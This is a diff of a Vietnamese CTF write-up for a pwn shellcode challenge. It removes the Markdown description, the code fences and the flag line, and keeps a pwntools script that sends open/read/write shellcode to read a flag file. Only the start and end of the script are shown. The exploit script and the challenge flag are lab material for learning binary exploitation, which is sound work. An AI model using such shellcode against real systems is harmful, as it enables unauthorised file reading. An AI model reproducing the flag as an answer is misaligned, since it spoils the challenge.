@@ -1,17 +1,3 @@
-# **Shellcode - PWN CTF Challenge**
-
-### ***Description***
-> Dễ mà tự viết đi trên trên mạng không có đâu
-> - Bắt buộc dùng open, read, write để đọc flag
-> - Không cần quan tâm đến seccomp
-> - Dùng syscall ngoài open, read, write sẽ bị khóa
-
-### ***Exploitation***
----
-
-
-
-```
 from pwn import *
 
 #p = process('./shellcode')
@@ -44,14 +30,4 @@ shellcode = asm('\n'.join([
 r.recvuntil(b'PhaPhaKhongCoDon.txt\n')
 r.sendline(shellcode)
 r.interactive()
-
-```
-
-![flag](images/flag.png)
-
-> **FLAG: Wanna.One{ve_so_sang_mua_chieu_xo_em_nghi_anh_la_ai_ma_sang_cua_chieu_do}**
-
-
-
-
 
